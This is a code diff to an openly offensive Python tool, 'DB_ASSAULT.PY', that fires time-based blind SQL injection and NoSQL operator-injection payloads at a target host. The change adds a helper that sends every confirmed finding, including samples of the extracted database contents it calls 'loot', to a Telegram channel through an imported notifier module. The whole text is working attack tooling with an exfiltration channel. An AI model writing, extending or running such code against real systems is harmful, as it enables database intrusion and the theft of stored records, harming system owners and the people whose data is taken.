@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
 """
-DB_ASSAULT.PY — Aggressive Database Exploitation & Time-Based Blind Injection Engine
+DB_ASSAULT.PY — Aggressive Database Exploitation & Time-Based Blind Injection Engine (With Telegram Telemetry)
 Features:
 - Real time-based blind SQL injection (SLEEP / BENCHMARK payload vectors)
 - Boolean and error-based inference checks
 - Advanced NoSQL operator injection ($ne, $gt, $where) with record collection
 - Zero-disk live terminal streaming with unredacted red-team evidence output
+- Real-time asynchronous Telegram notification dispatch for unredacted database loot
 """
 import asyncio
 import http.client
@@ -14,6 +15,9 @@ import ssl
 import time
 import sys
 from urllib.parse import urlsplit, quote
+
+# Import centralized Telegram broadcaster
+from modules.telegram_notifier import send_telegram_alert
 
 REQUEST_TIMEOUT = 12
 MAX_RESPONSE_SIZE = 128 * 1024
@@ -35,6 +39,17 @@ def log(msg, color="\033[92m"):
     sys.stdout.write(f"{color}{msg}\033[0m\n")
     sys.stdout.flush()
 
+def broadcast_tg_alert_sync(loot_type, details):
+    """Helper to non-blockingly fire Telegram alerts from synchronous database assault functions."""
+    try:
+        loop = asyncio.get_running_loop()
+        loop.create_task(send_telegram_alert(loot_type, details))
+    except RuntimeError:
+        try:
+            asyncio.run(send_telegram_alert(loot_type, details))
+        except Exception:
+            pass
+
 def send_http(host, port, path, payload, secure, method="POST"):
     conn = None
     start = time.monotonic()
@@ -55,7 +70,7 @@ def send_http(host, port, path, payload, secure, method="POST"):
             ct = "application/x-www-form-urlencoded"
             
         headers = {
-            "User-Agent": "NEXUS-OffensiveEngine/3.1",
+            "User-Agent": "NEXUS-OffensiveEngine/8.0",
             "Content-Type": ct,
             "Accept": "*/*",
             "Connection": "close"
@@ -93,13 +108,18 @@ async def run_nosql_assault(target_host, port=None, use_ssl=None):
             if res["elapsed"] >= 4.5:
                 log(f"[!] TIME-BASED BLIND SQLi CONFIRMED [{endpoint}] (Delay: {res['elapsed']}s)", "\033[91m")
                 log(f"    └── Unredacted Evidence -> Payload: {payload} | Elapsed: {res['elapsed']}s", "\033[93m")
-                findings.append({
+                
+                finding = {
                     "vector": "Time-Based Blind SQLi",
                     "endpoint": endpoint,
                     "payload": payload,
                     "delay": res["elapsed"],
                     "status": res["status"]
-                })
+                }
+                findings.append(finding)
+                
+                # BROADCAST TO TELEGRAM
+                broadcast_tg_alert_sync("Time-Based Blind SQLi Confirmed", finding)
 
         # 2. NoSQL Operator & Extraction Assault
         for payload in NOSQL_EXTRACTION_PAYLOADS:
@@ -108,18 +128,22 @@ async def run_nosql_assault(target_host, port=None, use_ssl=None):
             if res["status"] in (200, 201) and len(res["body"]) > 50:
                 log(f"[+] NoSQL BYPASS / DATA EXFILTRATION TRIGGERED [{endpoint}] (Status: {res['status']})", "\033[92m")
                 log(f"  └── Unredacted Response Excerpt: {res['body'][:300]}", "\033[96m")
-                findings.append({
+                
+                finding = {
                     "vector": "NoSQL Operator Injection",
                     "endpoint": endpoint,
-                    "payload": payload,
+                    "payload": str(payload),
                     "status": res["status"],
                     "response_sample": res["body"][:500]
-                })
+                }
+                findings.append(finding)
+                
+                # BROADCAST TO TELEGRAM
+                broadcast_tg_alert_sync("NoSQL Operator Injection Bypass", finding)
 
     log(f"[+] Database assault complete. Total confirmed vectors: {len(findings)}", "\033[92m")
     return findings
 
 if __name__ == "__main__":
-    import sys
     target = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
     asyncio.run(run_nosql_assault(target))
